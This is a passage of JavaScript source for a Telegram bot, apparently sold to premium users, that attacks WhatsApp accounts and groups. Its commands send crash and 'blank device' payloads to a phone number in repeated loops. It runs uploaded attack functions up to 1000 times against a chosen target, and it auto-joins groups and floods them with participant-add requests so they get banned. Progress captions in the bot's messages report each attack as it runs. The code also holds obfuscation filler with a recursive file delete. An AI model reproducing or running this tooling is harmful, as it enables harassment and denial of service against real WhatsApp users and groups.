  photoOpts.caption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Lock Message Whatsapp\n➩ Status : Process...\n➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>";
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "Target",
      url: "https://wa.me/" + phoneNumber
    }]
  ];
  const sentMessage = await ctx.telegram.sendPhoto(ctx.chat.id, coverImage, photoOpts),
    messageId = sentMessage.message_id;

  function buildBar(percent) {
    const filled = Math.round(percent / 10);
    const empty = 10 - filled;
    return "▓".repeat(filled) + "░".repeat(empty);
  }
  async function updateCaption(percent) {
    const helper = {};
    helper.or = function (a, b) {
      return a || b;
    };
    helper.newsletter = "@newsletter";
    const H = helper;
    const bar = buildBar(percent);
    await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Lock Message Whatsapp \n➩ Status : Process...\n➩ Progress : [" + bar + "] " + percent + "%</pre></blockquote>", {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{
            text: "Target",
            url: "https://wa.me/" + phoneNumber
          }]
        ]
      }
    });
  }
  for (let index = 0; index < 5; index++) {
    await sendDprasuBug(null, targetJid);
    await sendH4tersBug(null, targetJid);
    const percent = Math.min(Math.round((index + 1) * 0.6666666666666666), 100);
    await updateCaption(percent);
    await sleep(2000);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Lock Message Whatsapp\n➩ Status : Success ✅\n➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Target",
          url: "https://wa.me/" + phoneNumber
        }]
      ]
    }
  });
});
bot.command("dblacker", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const coverImage = "https://files.catbox.moe/9ayxax.jpg";
  const phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 ☇ Format: /dblacker 62×××");
  let targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoOpts = {};
  photoOpts.caption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Blank Device \n➩ Status : Process...\n➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>";
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "Target",
      url: "https://wa.me/" + phoneNumber
    }]
  ];
  const sentMessage = await ctx.telegram.sendPhoto(ctx.chat.id, coverImage, photoOpts),
    messageId = sentMessage.message_id;

  function buildBar(percent) {
    const filled = Math.round(percent / 10),
      empty = 10 - filled;
    return "▓".repeat(filled) + "░".repeat(empty);
  }
  async function updateCaption(percent) {
    const bar = buildBar(percent);
    await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Blank Device \n➩ Status : Process...\n➩ Progress : [" + bar + "] " + percent + "%</pre></blockquote>", {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{
            text: "Target",
            url: "https://wa.me/" + phoneNumber
          }]
        ]
      }
    });
  }
  for (let index = 0; index < 100; index++) {
    await sendBlankDevice2Bug(null, targetJid);
    const percent = Math.min(Math.round((index + 1) * 0.6666666666666666), 100);
    await updateCaption(percent);
    await sleep(2000);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Blank Device\n➩ Status : Success ✅\n➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Target",
          url: "https://wa.me/" + phoneNumber
        }]
      ]
    }
  });
});
bot.command("fcnewclick", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const coverImage = "https://files.catbox.moe/5lrxrf.jpg",
    phoneNumber = ctx.message.text.split(" ")[1];
  if (!phoneNumber) return ctx.reply("🪧 ☇ Format: /fcnewclick 62×××");
  let targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoOpts = {};
  photoOpts.caption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Forceclose Click\n➩ Status : Sending Bug Waiting...\n</pre></blockquote>";
  photoOpts.parse_mode = "HTML";
  photoOpts.reply_markup = {};
  photoOpts.reply_markup.inline_keyboard = [
    [{
      text: "Target",
      url: "https://wa.me/" + phoneNumber
    }]
  ];
  const sentMessage = await ctx.telegram.sendPhoto(ctx.chat.id, coverImage, photoOpts),
    messageId = sentMessage.message_id;
  for (let index = 0; index < 50; index++) {
    await sendNazeGacorBug(null, targetJid);
    await sendNovaCrashNoClickBug(null, targetJid);
  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + phoneNumber + "\n➩ Effect : Forceclose Click\n➩ Status : Sending Bug Waiting...\n</pre></blockquote>", {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{
          text: "Target",
          url: "https://wa.me/" + phoneNumber
        }]
      ]
    }
  });
});

function wrapSockFunctions(sock) {
  if (!sock) return null;
  return {
    sendMessage: sock.sendMessage?.["bind"](sock),
    relayMessage: sock.relayMessage?.["bind"](sock),
    groupMetadata: sock.groupMetadata?.["bind"](sock)
  };
}

function extractInviteCode(input = "") {
  try {
    const pattern = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i,
      match = input.match(pattern);
    if (!match) return null;
    return match[1];
  } catch {
    return null;
  }
}

function buildProgressBar(percent) {
  const helper = {};
  helper.divide = function (a, b) {
    return a / b;
  };
  helper.subtract = function (a, b) {
    return a - b;
  };
  helper.concat = function (a, b) {
    return a + b;
  };
  const H = helper;
  const filled = Math.round(H.divide(percent, 10)),
    empty = H.subtract(10, filled);
  return H.concat("▓".repeat(filled), "░".repeat(empty));
}

function formatElapsed(msInput) {
  const helper = {};
  helper.divide = function (a, b) {
    return a / b;
  };
  helper.modulo = function (a, b) {
    return a % b;
  };
  helper.greaterThan = function (a, b) {
    return a > b;
  };
  const H = helper,
    totalSeconds = Math.floor(H.divide(msInput, 1000));
  const minutes = Math.floor(H.divide(totalSeconds, 60)),
    seconds = H.modulo(totalSeconds, 60);
  return H.greaterThan(minutes, 0) ? minutes + "m " + seconds + "s" : seconds + "s";
}
async function resolveFunctionSource(ctx) {
  const repliedMessage = ctx.message?.["reply_to_message"];
  if (!repliedMessage) {
    const failResult = {};
    failResult.ok = false;
    failResult.reason = "Reply dengan function (text atau file .js)";
    return failResult;
  }
  let sourceCode = null;
  if (repliedMessage.text) sourceCode = repliedMessage.text;
  else {
    if (repliedMessage.document) {
      const document = repliedMessage.document,
        fileName = document.file_name || "";
      if (!fileName.endsWith(".js") && !fileName.endsWith(".cjs")) {
        const failResult = {};
        failResult.ok = false;
        failResult.reason = "File harus .js atau .cjs";
        return failResult;
      }
      if (document.file_size > 5242880) {
        const failResult = {};
        failResult.ok = false;
        failResult.reason = "File terlalu besar (max 5MB)";
        return failResult;
      }
      try {
        const fileLink = await ctx.telegram.getFileLink(document.file_id),
          fileResponse = await fetch(fileLink.href);
        sourceCode = await fileResponse.text();
      } catch (err) {
        return {
          ok: false,
          reason: "Gagal download file: " + err.message
        };
      }
    } else if (repliedMessage.caption) sourceCode = repliedMessage.caption;
  }
  if (!sourceCode) {
    const failResult = {};
    failResult.ok = false;
    failResult.reason = "Source code tidak ditemukan";
    return failResult;
  }
  const functionMatch = sourceCode.match(/async function\s+(\w+)/);
  if (!functionMatch) {
    const failResult = {};
    failResult.ok = false;
    failResult.reason = "Function harus async function";
    return failResult;
  }
  const successResult = {};
  successResult.ok = true;
  successResult.code = sourceCode;
  successResult.name = functionMatch[1];
  return successResult;
}
bot.command("testfunction", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const chatId = ctx.chat.id;
  try {
    const rawText = ctx.message?.["text"] || "",
      args = rawText.split(" ");
    if (args.length < 3) {
      const opts = {};
      opts.parse_mode = "HTML";
      return ctx.reply("<blockquote>🪧 <b>CARA PENGGUNAAN</b></blockquote>\n\n<b>Format:</b>\n<code>/testfunction &lt;nomor&gt; &lt;jumlah&gt;</code>\n\n<b>Contoh:</b>\n<code>/testfunction 628123456789 10</code>\n\n<b>Reply dengan:</b>\n➤ <b>Text</b> berisi async function\n➤ <b>File .js</b> berisi async function\n➤ <b>File .cjs</b> berisi async function\n\n<b>Catatan:</b>\n➤ Jumlah maksimal <b>1000</b>\n➤ Delay per eksekusi <b>200ms</b>", opts);
    }
    const phoneNumber = args[1];
    let totalLoops = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(totalLoops)) {
      return ctx.reply("❌ Jumlah harus berupa angka.");
    }
    const targetJid = phoneNumber.replace(/[^0-9]/g, "") + "@s.whatsapp.net",
      sourceResult = await resolveFunctionSource(ctx);
    if (!sourceResult.ok) {
      const opts = {};
      opts.parse_mode = "HTML";
      return ctx.reply("<blockquote>❌ <b>SOURCE CODE ERROR</b></blockquote>\n\n" + sourceResult.reason + "\n\nReply dengan <b>text</b> atau <b>file .js</b> yang berisi async function.", opts);
    }
    const sourceCode = sourceResult.code,
      functionName = sourceResult.name,
      coverImage = "https://files.catbox.moe/b6jf12.jpg",
      sentMessage = await ctx.replyWithPhoto(coverImage, {
        caption: "༺ <b>GXION INFORMATION ATTACK</b> ༻\n<blockquote><pre>\n➩ Target     : " + phoneNumber + "\n➩ Function   : " + functionName + "\n➩ Effect     : Unknown Function\n➩ Total      : " + totalLoops + "x\n➩ Status     : Initializing...\n➩ Progress   : [" + buildProgressBar(0) + "] 0%</pre></blockquote>",
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{
              text: "👤 Target Check",
              url: "https://wa.me/" + phoneNumber,
              style: "success"
            }]
          ]
        }
      }),
      messageId = sentMessage.message_id,
      vmModule = require("vm"),
      wrappedSock = wrapSockFunctions(null),
      sandbox = {};
    sandbox.console = console;
    sandbox.Buffer = Buffer;
    sandbox.sock = wrappedSock;
    sandbox.target = targetJid;
    sandbox.sleep = sleep;
    sandbox.require = require;
    sandbox.setTimeout = setTimeout;
    sandbox.clearTimeout = clearTimeout;
    sandbox.setInterval = setInterval;
    sandbox.clearInterval = clearInterval;
    sandbox.Promise = Promise;
    sandbox.Date = Date;
    sandbox.Math = Math;
    sandbox.JSON = JSON;
    const context = sandbox,
      vmContext = vmModule.createContext(context),
      fullCode = sourceCode + "\n" + functionName;
    let runnerFunction;
    try {
      runnerFunction = vmModule.runInContext(fullCode, vmContext);
    } catch (compileError) {
      const opts = {};
      opts.parse_mode = "HTML";
      return ctx.telegram.editMessageCaption(chatId, messageId, null, "༺ <b>GXION INFORMATION ATTACK</b> ༻\n<blockquote><pre>\n➩ Target     : " + phoneNumber + "\n➩ Function   : " + functionName + "\n➩ Status     : ❌ Compile Failed\n➩ Reason     : " + compileError.message + "</pre></blockquote>", opts);
    }
    let sentCount = 0,
      failedCount = 0;
    const startTime = Date.now();
    for (let loop = 0; loop < totalLoops; loop++) {
      try {
        const argCount = runnerFunction.length;
        if (argCount === 1) await runnerFunction(targetJid);
        else {
          if (argCount === 2) await runnerFunction(wrappedSock, targetJid);
          else await runnerFunction(wrappedSock, targetJid, true);
        }
        sentCount++;
      } catch (err) {
        failedCount++;
        console.log("[testfunction] Loop " + (loop + 1) + " error: " + err.message);
      }
      const percent = Math.min(Math.round((loop + 1) / totalLoops * 100), 100),
        progressBar = buildProgressBar(percent),
        elapsed = formatElapsed(Date.now() - startTime);
      ((loop + 1) % 5 === 0 || loop === totalLoops - 1) && (await ctx.telegram.editMessageCaption(chatId, messageId, null, "༺ <b>GXION INFORMATION ATTACK</b> ༻\n<blockquote><pre>\n➩ Target     : " + phoneNumber + "\n➩ Function   : " + functionName + "\n➩ Effect     : Unknown Function\n➩ Sent       : " + sentCount + "/" + totalLoops + "\n➩ Failed     : " + failedCount + "\n➩ Status     : Processing...\n➩ Progress   : [" + progressBar + "] " + percent + "%\n➩ Elapsed    : " + elapsed + "</pre></blockquote>", {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{
              text: "👤 Target Check",
              url: "https://wa.me/" + phoneNumber,
              style: "success"
            }]
          ]
        }
      }).catch(() => {})), await sleep(200);
    }
    const totalElapsed = formatElapsed(Date.now() - startTime),
      finalCaption = "༺ <b>GXION INFORMATION ATTACK</b> ༻\n<blockquote><pre>\n➩ Target     : " + phoneNumber + "\n➩ Function   : " + functionName + "\n➩ Effect     : Unknown Function\n➩ Sent       : " + sentCount + "/" + totalLoops + "\n➩ Failed     : " + failedCount + "\n➩ Status     : ✅ Success\n➩ Progress   : [" + buildProgressBar(100) + "] 100%\n➩ Duration   : " + totalElapsed + "</pre></blockquote>";
    try {
      const finalOpts = {};
      finalOpts.parse_mode = "HTML";
      finalOpts.reply_markup = {};
      finalOpts.reply_markup.inline_keyboard = [
        [{
          text: "👤 Target Check",
          url: "https://wa.me/" + phoneNumber,
          style: "success"
        }]
      ];
      await ctx.telegram.editMessageCaption(chatId, messageId, null, finalCaption, finalOpts);
    } catch {
      const failOpts = {};
      failOpts.caption = finalCaption;
      failOpts.parse_mode = "HTML";
      await ctx.replyWithPhoto(coverImage, failOpts);
    }
  } catch (fatalError) {
    console.error("ERROR:", fatalError);
    ctx.reply("❌ Terjadi error: " + fatalError.message).catch(() => {});
  }
});
bot.command("testfunctiongb", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const chatId = ctx.chat.id;
  try {
    const rawText = ctx.message?.["text"] || "",
      args = rawText.split(" ");
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunctiongb <link_grup_wa> 10 (reply your function)");
    }
    const groupLink = args[1];
    let totalLoops = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(totalLoops)) {
      return ctx.reply("❌ Jumlah harus angka");
    }
    let targetJid = groupLink.trim();
    const inviteCode = extractInviteCode(targetJid);
    inviteCode && (targetJid = inviteCode);
    if (!targetJid.includes("@g.us")) {
      const groupInfo = await (async () => {
        try {
          throw new Error("WA not connected");
          return await botRuntime.sock.groupGetInviteInfo(targetJid);
        } catch (err) {
          return console.log(chalk.yellow("⚠️ [testfunctiongb] " + err.message)), null;
        }
      })();
      if (!groupInfo || !groupInfo.id) {
        return ctx.replyWithHTML("❌ Gagal resolve grup.\nPastikan link invite valid atau bot sudah join grup.");
      }
      targetJid = groupInfo.id;
    }
    if (!ctx.message.reply_to_message?.["text"]) {
      return ctx.reply("❌ Reply dengan function");
    }
    const coverImage = "https://files.catbox.moe/b6jf12.jpg",
      originalLink = groupLink,
      photoOpts = {};
    photoOpts.caption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + originalLink + "\n➩ Group ID : " + targetJid + "\n➩ Effect : Unknown Function (GB)\n➩ Status : Processing...\n➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>";
    photoOpts.parse_mode = "HTML";
    photoOpts.reply_markup = {};
    photoOpts.reply_markup.inline_keyboard = [
      [{
        text: "Target Check",
        url: "https://chat.whatsapp.com/" + (inviteCode || groupLink),
        style: "success"
      }]
    ];
    const sentMessage = await ctx.replyWithPhoto(coverImage, photoOpts),
      messageId = sentMessage.message_id,
      sourceCode = ctx.message.reply_to_message.text,
      functionMatch = sourceCode.match(/async function\s+(\w+)/);
    if (!functionMatch) return ctx.reply("❌ Function harus async function");
    const functionName = functionMatch[1],
      vmModule = require("vm"),
      wrappedSock = wrapSockFunctions(null),
      sandbox = {};
    sandbox.console = console;
    sandbox.Buffer = Buffer;
    sandbox.sock = wrappedSock;
    sandbox.target = targetJid;
    sandbox.sleep = sleep;
    sandbox.require = require;
    const context = sandbox,
      vmContext = vmModule.createContext(context),
      fullCode = sourceCode + "\n" + functionName,
      runnerFunction = vmModule.runInContext(fullCode, vmContext);

    function buildBar(percent) {
      const filled = Math.round(percent / 10);
      const empty = 10 - filled;
      return "▓".repeat(filled) + "░".repeat(empty);
    }
    for (let loop = 0; loop < totalLoops; loop++) {
      try {
        const argCount = runnerFunction.length;
        if (argCount === 1) await runnerFunction(targetJid);
        else {
          if (argCount === 2) await runnerFunction(wrappedSock, targetJid);
          else await runnerFunction(wrappedSock, targetJid, true);
        }
        const percent = Math.min(Math.round((loop + 1) * (100 / totalLoops)), 100),
          progressBar = buildBar(percent);
        await ctx.telegram.editMessageCaption(chatId, messageId, null, "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + originalLink + "\n➩ Group ID : " + targetJid + "\n➩ Effect : Unknown Function (GB)\n➩ Status : Processing...\n➩ Progress : [" + progressBar + "] " + percent + "%</pre></blockquote>", {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{
                text: "Target Check",
                url: "https://chat.whatsapp.com/" + (inviteCode || groupLink),
                style: "success"
              }]
            ]
          }
        });
      } catch (err) {
        console.log("Loop error:", err.message);
      }
      await new Promise(resolve => setTimeout(resolve, 200));
    }
    const finalCaption = "༺ GXION INFORMATION ATACK ༻\n<blockquote><pre>\n➩ Target : " + originalLink + "\n➩ Group ID : " + targetJid + "\n➩ Effect : Unknown Function (GB)\n➩ Status : Success ✅\n➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>";
    try {
      await ctx.telegram.editMessageCaption(chatId, messageId, null, finalCaption, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{
              text: "Target Check",
              url: "https://chat.whatsapp.com/" + (inviteCode || groupLink),
              style: "success"
            }]
          ]
        }
      });
    } catch {
      const failOpts = {};
      failOpts.caption = finalCaption;
      failOpts.parse_mode = "HTML";
      await ctx.replyWithPhoto(coverImage, failOpts);
    }
  } catch (fatalError) {
    console.error("ERROR:", fatalError);
    ctx.reply("❌ Terjadi error");
  }
});

function ensureSockReady(sock) {
  const helper = {};
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  helper.tagA = "HGfaF";
  helper.tagB = "DDVRE";
  helper.notReadyMsg = "WhatsApp socket tidak siap. Pastikan bot sudah terhubung.";
  const H = helper;
  if (!sock || !sock.user) {
    if (H.notEquals(H.tagA, H.tagB)) throw new Error(H.notReadyMsg);
    else foundEmojis.push({
      id: entity.custom_emoji_id,
      emoji: repliedMessage.text?.["substring"](entity.offset, H.concat(entity.offset, entity.length)) || "❔"
    });
  }
  return true;
}

function isReachoutRestricted(message) {
  const helper = {};
  helper.restrictedType = "account_reachout_restricted";
  helper.reachoutKeyword = "reachout";
  helper.restrictedKeyword = "restricted";
  const H = helper;
  return message?.["includes"](H.restrictedType) || message?.["includes"](H.reachoutKeyword) || message?.["includes"](H.restrictedKeyword);
}
async function injectGroupParticipantBugs(sock, targetGroupId) {
  const helper = {};
  helper.groupSuffix = "@g.us";
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "TabZd";
  helper.groupRequiredMsg = "@g.us server required";
  helper.defaultFakeJid1 = "6280000000000@s.whatsapp.net";
  helper.fakeJidUs1 = "14155552671@s.whatsapp.net";
  helper.fakeJidUk1 = "447400000000@s.whatsapp.net";
  helper.fakeJidAu1 = "61400000000@s.whatsapp.net";
  helper.fakeJidId1 = "6281234567890@s.whatsapp.net";
  helper.fakeJidId2 = "6285655555555@s.whatsapp.net";
  helper.fakeJidId3 = "6289876543210@s.whatsapp.net";
  helper.fakeJidId4 = "6281111111111@s.whatsapp.net";
  helper.fakeJidId5 = "6282222222222@s.whatsapp.net";
  helper.fakeJidId6 = "6284444444444@s.whatsapp.net";
  helper.fakeJidId7 = "6285555555555@s.whatsapp.net";
  helper.fakeJidId8 = "6287777777777@s.whatsapp.net";
  helper.fakeJidId9 = "6288888888888@s.whatsapp.net";
  helper.fakeJidId10 = "6289999999999@s.whatsapp.net";
  helper.fakeJidId11 = "6281000000001@s.whatsapp.net";
  helper.fakeJidId12 = "6281000000002@s.whatsapp.net";
  helper.fakeJidId13 = "6281000000003@s.whatsapp.net";
  helper.fakeJidId14 = "6281000000004@s.whatsapp.net";
  helper.fakeJidId15 = "6281000000005@s.whatsapp.net";
  helper.fakeJidId16 = "6282000000001@s.whatsapp.net";
  helper.fakeJidId17 = "6282000000002@s.whatsapp.net";
  helper.fakeJidId18 = "6282000000003@s.whatsapp.net";
  helper.fakeJidId19 = "6282000000004@s.whatsapp.net";
  helper.fakeJidId20 = "6282000000005@s.whatsapp.net";
  helper.fakeJidId21 = "6283000000001@s.whatsapp.net";
  helper.fakeJidId22 = "6283000000002@s.whatsapp.net";
  helper.fakeJidId23 = "6283000000003@s.whatsapp.net";
  helper.fakeJidId24 = "6283000000004@s.whatsapp.net";
  helper.fakeJidId25 = "6283000000005@s.whatsapp.net";
  helper.actionAdd = "add";
  helper.multiply = function (a, b) {
    return a * b;
  };
  const H = helper;
  if (!targetGroupId.endsWith(H.groupSuffix)) {
    if (H.equals(H.tag, "dIQVO")) {
      if (fs.lstatSync(targetPath).isDirectory()) {
        const rmOpts = {};
        rmOpts.recursive = true;
        rmOpts.force = true;
        fs.rmSync(targetPath, rmOpts);
      } else fs.unlinkSync(targetPath);
    } else throw new Error(H.groupRequiredMsg);
  }
  const fakeJids = [H.defaultFakeJid1, H.fakeJidUs1, H.fakeJidUk1, H.fakeJidAu1, H.fakeJidId1, "6287873499996@s.whatsapp.net", H.fakeJidId2, H.fakeJidId3, H.fakeJidId4, H.fakeJidId5, "6283333333333@s.whatsapp.net", H.fakeJidId6, H.fakeJidId7, "6286666666666@s.whatsapp.net", H.fakeJidId8, H.fakeJidId9, H.fakeJidId10, H.fakeJidId11, H.fakeJidId12, H.fakeJidId13, H.fakeJidId14, H.fakeJidId15, H.fakeJidId16, H.fakeJidId17, H.fakeJidId18, H.fakeJidId19, H.fakeJidId20, H.fakeJidId21, H.fakeJidId22, H.fakeJidId23, H.fakeJidId24, H.fakeJidId25];
  const actions = [H.actionAdd],
    randomJid = fakeJids[Math.floor(H.multiply(Math.random(), fakeJids.length))],
    randomAction = actions[Math.floor(H.multiply(Math.random(), actions.length))];
  try {
    return await sock.groupParticipantsUpdate(targetGroupId, [randomJid], randomAction), await new Promise(resolve => setTimeout(resolve, 2500)), true;
  } catch (err) {
    return await new Promise(resolve => setTimeout(resolve, 1500)), false;
  }
}

function extractWhatsAppInviteCode(input) {
  const match = input.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
  return match ? match[1] : null;
}
bot.command("bannedGroups", requireConnectedSender, premiumOnly, withCooldown, async ctx => {
  const messageText = ctx.message.text || "",
    args = messageText.split(" "),
    target = args[1];
  if (!target) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("🪧 *Format:* /bannedGroups https://chat.whatsapp.com/xxxxxx atau ID Grup\n\n*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).", opts);
  }
  const inviteCode = extractWhatsAppInviteCode(target),
    isGroupId = target.includes("@g.us");
  if (!inviteCode && !isGroupId) {
    const opts = {};
    opts.parse_mode = "Markdown";
    return ctx.reply("❌ *Input tidak valid!* Pastikan link undangan atau JID grup benar.", opts);
  }
  const coverImage = "https://files.catbox.moe/b6jf12.jpg";
  const photoOpts = {};
  photoOpts.caption = "<blockquote>𝐆𝐗 𝐈 𝐎𝐍 𝐁𝐀𝐍𝐍𝐄𝐃 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃𝐄</blockquote>\n<pre><code>├──────────────────────────────┤\n│ TARGET:  🚀 " + target + "\n│ MODE:  ⛔ Auto Join + Banned\n│ STATUS: 🔎 Scanning Group And Member Group....\n└───────────────────────────────</code></pre>";
  photoOpts.parse_mode = "HTML";
  const sentMessage = await ctx.telegram.sendPhoto(ctx.chat.id, coverImage, photoOpts),
    messageId = sentMessage.message_id;
  try {
    let resolvedGroupId = null;
    if (!isGroupId && inviteCode) {
      try {
        resolvedGroupId = await botRuntime.sock.groupAcceptInvite(inviteCode);
      } catch (err) {
        if (err.message.includes("already") || err.message.includes("exist")) try {
          const groupInfo = await botRuntime.sock.groupGetInviteInfo(inviteCode);
          if (groupInfo && groupInfo.id) resolvedGroupId = groupInfo.id;
        } catch (innerErr) {
          throw new Error("Bot sudah join, namun gagal mendapatkan ID grup");
        } else {
          throw err;
        }
      }
    } else isGroupId && (resolvedGroupId = target);
    if (!resolvedGroupId) throw new Error("Gagal mendapatkan target grup");
    const progressOpts = {};
    progressOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "<blockquote><pre>𝐆𝐗 𝐈 𝐎𝐍 𝐁𝐀𝐍𝐍𝐄𝐃 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃𝐄</pre></blockquote>\n<pre><code>┌───────────────────────────────┐\n│ TARGET  : 🚀 " + resolvedGroupId + "\n│ MODE    : ⛔ Auto Join + Group Ban\n│ STATUS  : ✅ Group terdeteksi! Sedang Mengeksekusi...\n└───────────────────────────────┘\n</code></pre>", progressOpts);
    for (let index = 0; index < 20; index++) {
      try {
        await injectGroupParticipantBugs(null, resolvedGroupId);
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (err) {
        console.log(chalk.yellow("Pengiriman Banned Group " + (index + 1) + ": " + err.message));
        if (err.message.includes("not-authorized") || err.message.includes("invalid") || err.message.includes("not-found")) break;
      }
    }
    const successOpts = {};
    successOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "<blockquote><pre>𝐆𝐗 𝐈 𝐎𝐍 𝐁𝐀𝐍𝐍𝐄𝐃 𝐆𝐑𝐎𝐔𝐏 𝐌𝐎𝐃𝐄</pre></blockquote>\n<pre><code>┌───────────────────────────────┐\n│ TARGET  : 🚀 " + target + "\n│ MODE    : Auto Join + Banned\n│ STATUS  : ✅ Berhasil Membanned Group!\n└───────────────────────────────┘\n</code></pre>", successOpts);
  } catch (err) {
    console.error(chalk.red("❌ Gagal: " + err.message));
    let friendlyError = err.message;
    if (friendlyError.includes("already") || friendlyError.includes("exist")) friendlyError = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
    else {
      if (friendlyError.includes("invalid") || friendlyError.includes("expired")) friendlyError = "Link undangan tidak valid atau sudah kadaluarsa.";
      else {
        if (friendlyError.includes("not-authorized")) friendlyError = "Bot tidak memiliki akses (Not Authorized).";
        else {
          if (friendlyError.includes("not-found")) friendlyError = "Grup tidak ditemukan atau sudah dihapus.";
        }
      }
    }
    const failOpts = {};
    failOpts.parse_mode = "HTML";
    await ctx.telegram.editMessageCaption(ctx.chat.id, messageId, undefined, "<blockquote><pre>𝐆𝐗 𝐈 𝐎𝐍 • 𝐒𝐘𝐒𝐓𝐄𝐌</pre></blockquote>\n<pre><code>\n┌───────────────────────────────┐\n│ TARGET  : 🚀 " + target + "\n│ STATUS  : ❌ Failed\n│ ERROR   : " + friendlyError + "\n└───────────────────────────────┘\n</code></pre>", failOpts);
  }
});
bot.command("cekidgb", premiumOnly, requireConnectedSender, withCooldown, async ctx => {
  const sender = ctx.from,
    targetInput = ctx.message.text.split(" ")[1];
  if (!targetInput) return ctx.reply("🪧 Example: /cekidgb <link_grup_wa>\n🚀 Support link invite: chat.whatsapp.com/xxxxx\n📌 Bisa juga pakai ID grup langsung: 123xxx@g.us");
  let cleanedInput = targetInput.trim();
  if (cleanedInput.includes("chat.whatsapp.com/")) {
    const code = cleanedInput.split("chat.whatsapp.com/")[1].split(/[?&\s]/)[0];
    cleanedInput = code;
  }
  const safeFetchGroupInfo = async fetcher => {
      try {
        throw new Error("WA not connected");
        return await fetcher(null);
      } catch (err) {
        return console.log(chalk.yellow("⚠️ [cekidgb] " + err.message)), null;
      }
    },
    groupInfo = await safeFetchGroupInfo(async sock => {
      if (cleanedInput.includes("@g.us")) return await sock.groupMetadata(cleanedInput);
      const inviteInfo = await sock.groupGetInviteInfo(cleanedInput);
      return inviteInfo;
    });
  if (!groupInfo) return ctx.replyWithHTML("❌ Gagal mengambil info grup.\nPastikan bot sudah join grup atau link invite valid.");
  const subject = groupInfo.subject || "-",
    groupId = groupInfo.id || "-",
    owner = groupInfo.owner || "-",
    description = (groupInfo.desc || "-").substring(0, 200),
    participantCount = groupInfo.participants?.["length"] || "-";
  const createdAt = groupInfo.creation ? new Date(groupInfo.creation * 1000).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta"
    }) : "-",
    isRestricted = groupInfo.restrict ? "✅ Ya" : "❌ Tidak",
    isAnnounce = groupInfo.announce ? "✅ Ya" : "❌ Tidak",
    isCommunity = groupInfo.isCommunity ? "✅ Ya" : "❌ Tidak",
    isCommunityAnnounce = groupInfo.isCommunityAnnounce ? "✅ Ya" : "❌ Tidak",
    linkedParent = groupInfo.linkedParent || "-",
    groupSize = groupInfo.size || participantCount;
  const requestTime = new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  });
